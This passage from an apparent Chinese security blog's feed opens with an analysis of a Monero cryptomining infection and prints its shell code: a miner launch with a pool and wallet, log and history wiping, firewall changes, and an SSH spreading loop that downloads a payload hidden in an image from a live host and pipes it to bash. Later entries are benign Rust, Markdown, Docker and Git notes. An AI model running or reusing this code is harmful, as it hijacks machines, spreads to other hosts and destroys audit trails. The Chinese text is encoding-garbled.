class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chmod <span class="number">777</span> /etc/zzh</span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">    ps.original -fe|grep zzh |grep -v grep</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ps -fe|grep zzh |grep -v grep</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ $? -ne <span class="number">0</span> ]</span><br><span class="line">then</span><br><span class="line">            cd /etc</span><br><span class="line">            echo <span class="string">&quot;not root runing&quot;</span></span><br><span class="line">            sleep 5s</span><br><span class="line">            cpunum=<span class="string">`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­cpuæ ¸æ•°å¯åŠ¨æŒ–çŸ¿ç¨‹åº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">2</span> )); then</span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">4</span>)); then</span><br><span class="line">      cpunum=<span class="number">2</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">8</span>)); then</span><br><span class="line">      cpunum=<span class="number">4</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">16</span>)); then</span><br><span class="line">      cpunum=<span class="number">8</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">32</span>)); then</span><br><span class="line">      cpunum=<span class="number">16</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">32</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&gt;<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">50</span></span><br><span class="line">      echo $cpunum</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">fi</span><br><span class="line">                ./zzh -B --log-file=<span class="regexp">/etc/</span>etc --coin=monero -o stratum+tcp:<span class="comment">//xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B1fHgyJ7nJMZPudMrqULw2xoVZfTrinLHJWFJqytnNYTQEVFATKqBnFGSurDPyDCefrHU1QbSCe7A7jDoyKJcUcEaif3Qs.3910 -p x &amp;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                echo <span class="string">&quot;root runing.....&quot;</span></span><br></pre></td></tr></table></figure><p>å¼€æ”¾ç«¯å£ï¼Œé‡å¯é˜²ç«å¢™ï¼Œæ¸…é™¤å†å²å‘½ä»¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">5555</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">7777</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">service iptables reload</span><br><span class="line">ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep <span class="string">&quot;stratum&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs kill -<span class="number">9</span></span><br><span class="line">history -c</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>spool/mail/root</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/wtmp</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/secure</span><br><span class="line">echo &gt; <span class="regexp">/root/</span>.bash_history</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„ŸæŸ“è®¾ç½®äº†å…å¯†ç™»å½•çš„ä¸»æœº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt-get install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;curl -o indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wd1 https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;cd1 -o  indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line">echo <span class="string">&quot;$bbdir&quot;</span></span><br><span class="line">echo <span class="string">&quot;$bbdira&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot;&gt;&lt;a href=&quot;#é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&quot;&gt;&lt;/a&gt;é—¨ç½—å¸xmrigæŒ–çŸ¿ç—…æ¯’åˆ†æ&lt;/h1&gt;&lt;p&gt;èµ·å› æ˜¯é˜Ÿé‡Œè€å¸ˆçš„æœåŠ¡å™¨ä¸­æ‹›äº†ï¼Œä¸è¿‡æ˜¯åœ¨doc</summary>
      
    
    
    
    
    <category term="åŒºå—é“¾å®‰å…¨" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>test-my-new-blog</title>
    <link href="https://x1a0.net/2021/11/05/test-my-new-blog/"/>
    <id>https://x1a0.net/2021/11/05/test-my-new-blog/</id>
    <published>2021-11-05T06:50:13.000Z</published>
    <updated>2021-11-05T07:23:34.151Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜"></a>æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜</h3><h4 id="æˆ‘æ˜¯å››çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯å››çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯å››çº§æ ‡é¢˜"></a>æˆ‘æ˜¯å››çº§æ ‡é¢˜</h4><h5 id="æˆ‘æ˜¯äº”çº§æ ‡é¢˜"><a href="#æˆ‘æ˜¯äº”çº§æ ‡é¢˜" class="headerlink" title="æˆ‘æ˜¯äº”çº§æ ‡é¢˜"></a>æˆ‘æ˜¯äº”çº§æ ‡é¢˜</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜</span><br><span class="line">#### æˆ‘æ˜¯å››çº§æ ‡é¢˜</span><br><span class="line">##### æˆ‘æ˜¯äº”çº§æ ‡é¢˜</span><br></pre></td></tr></table></figure><hr><p><em><strong>æˆ‘æ˜¯ç²—æ–œä½“</strong></em> </p><p><em>æˆ‘æ˜¯æ–œä½“</em></p><p><strong>æˆ‘æ˜¯ç²—ä½“</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">***æˆ‘æ˜¯ç²—æ–œä½“*** </span><br><span class="line"></span><br><span class="line">*æˆ‘æ˜¯æ–œä½“*</span><br><span class="line"></span><br><span class="line">**æˆ‘æ˜¯ç²—ä½“**</span><br></pre></td></tr></table></figure><hr><p><del>æˆ‘æ˜¯åˆ é™¤çº¿</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~æˆ‘æ˜¯åˆ é™¤çº¿~~</span><br></pre></td></tr></table></figure><hr><p><u>æˆ‘æ˜¯ä¸‹åˆ’çº¿</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;u&gt;æˆ‘æ˜¯ä¸‹åˆ’çº¿&lt;/u&gt;</span><br></pre></td></tr></table></figure><hr><ol><li>åˆ—è¡¨<ul><li>å°åˆ—è¡¨</li></ul></li><li>åˆ—è¡¨<ul><li>å¤§åˆ—è¡¨</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. åˆ—è¡¨</span><br><span class="line">    - å°åˆ—è¡¨</span><br><span class="line">2. åˆ—è¡¨</span><br><span class="line">    - å¤§åˆ—è¡¨</span><br></pre></td></tr></table></figure><hr><blockquote><p>åŒºå—</p><blockquote><p>ç¬¬äºŒå±‚åŒºå—</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; åŒºå—</span><br><span class="line">&gt;&gt; ç¬¬äºŒå±‚åŒºå—</span><br></pre></td></tr></table></figure><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget x1a0.net</span><br></pre></td></tr></table></figure><hr><p>è¿™æ˜¯<a href="x1a0.net">é“¾æ¥</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™æ˜¯[é“¾æ¥](x1a0.net)</span><br></pre></td></tr></table></figure><hr><p><img src="../../../../img/zhi.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](../../../../img/zhi.jpg)</span><br></pre></td></tr></table></figure><hr><table><thead><tr><th align="left">å·¦å¯¹é½</th><th align="right">å³å¯¹é½</th><th align="center">å±…ä¸­å¯¹é½</th></tr></thead><tbody><tr><td align="left">å•å…ƒæ ¼</td><td align="right">å•å…ƒæ ¼</td><td align="center">å•å…ƒæ ¼</td></tr><tr><td align="left">å•å…ƒæ ¼</td><td align="right">å•å…ƒæ ¼</td><td align="center">å•å…ƒæ ¼</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| å·¦å¯¹é½ | å³å¯¹é½ | å±…ä¸­å¯¹é½ |</span><br><span class="line">| :-----| ----: | :----: |</span><br><span class="line">| å•å…ƒæ ¼ | å•å…ƒæ ¼ | å•å…ƒæ ¼ |</span><br><span class="line">| å•å…ƒæ ¼ | å•å…ƒæ ¼ | å•å…ƒæ ¼ |</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot;&gt;&lt;a href=&quot;#æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot; class=&quot;headerlink&quot; title=&quot;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&quot;&gt;&lt;/a&gt;æˆ‘æ˜¯ä¸‰çº§æ ‡é¢˜&lt;/h3&gt;&lt;h4 id=&quot;æˆ‘æ˜¯å››çº§æ ‡é¢˜&quot;&gt;&lt;a href=&quot;#æˆ‘æ˜¯å››çº§æ ‡é¢˜&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Hexo" scheme="https://x1a0.net/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>rustå­¦ä¹ ç¬¬äºŒå¤©</title>
    <link href="https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/27/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2021-07-27T10:08:30.000Z</published>
    <updated>2021-07-27T11:21:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ‡ç‰‡</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œè¾“å‡ºç¬¬ä¸€ä¸ªå•è¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">first_word</span> </span>(_<span class="built_in">str</span>:&amp;<span class="built_in">str</span>) -&gt; &amp;<span class="built_in">str</span> &#123; <span class="comment">//éœ€è¦ä¼ å…¥å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œä¼ å‡ºä¹Ÿæ˜¯å­—ç¬¦ä¸²åˆ‡ç‰‡ã€‚</span></span><br><span class="line">    <span class="keyword">let</span> byte_str = _<span class="built_in">str</span>.as_bytes();<span class="comment">//å­—ç¬¦ä¸²åˆ‡ç‰‡ç±»å‹æ²¡æ³•ç›´æ¥è¿­ä»£ï¼Œé€šè¿‡as_bytesè½¬æ¢æˆå­—èŠ‚æ•°ç»„ã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (num,&amp;value) <span class="keyword">in</span> byte_str.iter().enumerate()&#123; <span class="comment">//é€šè¿‡å­—èŠ‚æ•°ç»„.iter().enumerate()è§£è€¦ï¼Œè¿”å›ï¼ˆä¸‹æ ‡ï¼Œå€¼ï¼‰ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> value == <span class="string">b&#x27; &#x27;</span> &#123; <span class="comment">//åªèƒ½ç”¨b&#x27; &#x27;è¿™ä¸ªè¡¨ç¤ºç©ºæ ¼ï¼Œä¸çŸ¥é“ç›´æ¥ &#x27; &#x27;ï¼Œ&quot; &quot;ä¸ºå•¥ä¸è¡Œã€‚</span></span><br><span class="line">            <span class="keyword">return</span> &amp;_<span class="built_in">str</span>[..num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;_<span class="built_in">str</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> _string_type_1 = <span class="string">&quot;hello xiaoyue&quot;</span>;<span class="comment">//æœ¬æ¥å°±æ˜¯å­—ç¬¦ä¸²å¼•ç”¨ç±»å‹ï¼Œ[å£°æ˜å‡ºæ¥ä¸å¯å˜äº†ï¼Œæ ˆä¸­çš„]</span></span><br><span class="line">    <span class="keyword">let</span> _string_type_2 = <span class="built_in">String</span>::from(<span class="string">&quot;hello xiaoyue&quot;</span>);<span class="comment">//è¿™ä¸ªæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ä¼ å‚çš„æ—¶å€™è¦åŠ &amp;å¼•ç”¨ç¬¦å·ï¼Œ[ä¸“é—¨å£°æ˜çš„å †ä¸­çš„]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> s = first_word(&amp;_string_type_2);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åˆ‡ç‰‡&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>rustå­¦ä¹ ç¬¬ä¸€å¤©</title>
    <link href="https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://x1a0.net/2021/07/26/rust%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2021-07-26T07:19:25.000Z</published>
    <updated>2021-07-27T11:21:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>åŒ…å¼•å…¥ï¼Œå–éšæœºæ•°ï¼Œæšä¸¾ç±»ä½¿ç”¨</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::stdin; <span class="comment">//å¼•å…¥stdinåŒ…ï¼Œé€šè¿‡sdtinä¸‹çš„read_lineå‡½æ•°è·å–å‘½ä»¤è¡Œè¿”å›å€¼</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng; <span class="comment">//å¼•å…¥Rngè¿™ä¸ªæ¥å£ï¼Œé€šè¿‡rand::thread_rng().gen_range()è·å–éšæœºæ•°</span></span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;<span class="comment">//å¼•å…¥æšä¸¾åŒ…ï¼Œé€šè¿‡ordering::xxæ¥æ§åˆ¶è¿”å›ï¼Œé€šè¿‡matchæŠ“å–ä¸åŒçš„ordering</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sec = rand::thread_rng().gen_range(<span class="number">1</span>..<span class="number">101</span>);      </span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;è¿™ä¸ªç§˜å¯†çš„æ•°æ˜¯ï¼š&#123;&#125;\n&quot;</span>,sec);</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> string1 = <span class="built_in">String</span>::new();<span class="comment">//å£°æ˜ä¸€ä¸ªstringç±»å‹çš„å¯å˜å˜é‡string::new()</span></span><br><span class="line">        stdin().read_line(&amp;<span class="keyword">mut</span> string1).expect(<span class="string">&quot;ä¸èƒ½è¯»å–ï¼\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">let</span> string1:<span class="built_in">i32</span> = <span class="keyword">match</span> string1.trim().parse() &#123; <span class="comment">//å˜é‡çš„è¦†ç›–ï¼Œé€šè¿‡let var_name:type = xxé‡æ–°è¦†ç›–å˜é‡ï¼Œå¿…é¡»å£°æ˜ç±»å‹ã€‚trimå»é¦–å°¾ç©ºï¼Œparseè½¬æ•°å­—ï¼ŒmatchæŠ“å–è¿”å›æˆåŠŸå’Œerrå€¼å¹¶æ‰“å°ã€‚</span></span><br><span class="line">            <span class="literal">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="literal">Err</span>(err) =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125;\n&quot;</span>,err);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> sec.cmp(&amp;string1) &#123; <span class="comment">//è¿™ä¸ªæ˜¯å°†string1å’Œsecè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">print!</span>(<span class="string">&quot;small\n&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">print!</span>(<span class="string">&quot;win!!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">print!</span>(<span class="string">&quot;big\n&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åŒ…å¼•å…¥ï¼Œå–éšæœºæ•°ï¼Œæšä¸¾ç±»ä½¿ç”¨&lt;/p&gt;
&lt;figure class=&quot;highlight rust&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;</summary>
      
    
    
    
    <category term="Rust" scheme="https://x1a0.net/categories/Rust/"/>
    
    
    <category term="Rust" scheme="https://x1a0.net/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>win11é»˜è®¤å¼€å¯hyper-vè§£å†³æ–¹æ¡ˆ</title>
    <link href="https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://x1a0.net/2021/07/16/win11%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AFhyper-v%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2021-07-15T18:42:22.000Z</published>
    <updated>2021-07-15T18:45:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¿«æ·é”®win+x,ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Windows Powershell<br>å…³é—­ï¼šbcdedit /set hypervisorlaunchtype off<br>å¼€å¯: bcdedit /set hypervisorlaunchtype auto</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¿«æ·é”®win+x,ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Windows Powershell&lt;br&gt;å…³é—­ï¼šbcdedit /set hypervisorlaunchtype off&lt;br&gt;å¼€å¯: bcdedit /set hypervisorlaunchtype auto&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://x1a0.net/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>centos7å®‰è£…dockerå’Œcompose</title>
    <link href="https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/"/>
    <id>https://x1a0.net/2021/05/04/centos7%E5%AE%89%E8%A3%85docker%E5%92%8Ccompose/</id>
    <published>2021-05-04T02:46:45.000Z</published>
    <updated>2021-05-04T03:29:48.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install docker #å®‰è£…</span><br><span class="line"></span><br><span class="line">service docker start #å¯åŠ¨</span><br><span class="line">chkconfig docker on  #è®¾ç½®å¯åŠ¨é¡¹</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composeÂ </span><br><span class="line"></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="Linux" scheme="https://x1a0.net/categories/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/categories/Docker/"/>
    
    
    <category term="Linux" scheme="https://x1a0.net/tags/Linux/"/>
    
    <category term="Docker" scheme="https://x1a0.net/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Gitè®¾ç½®ã€å–æ¶ˆä»£ç†</title>
    <link href="https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/"/>
    <id>https://x1a0.net/2021/05/04/Git%E8%AE%BE%E7%BD%AE%E3%80%81%E5%8F%96%E6%B6%88%E4%BB%A3%E7%90%86/</id>
    <published>2021-05-04T02:22:28.000Z</published>
    <updated>2021-05-04T03:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è®¾ç½®ä»£ç†</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 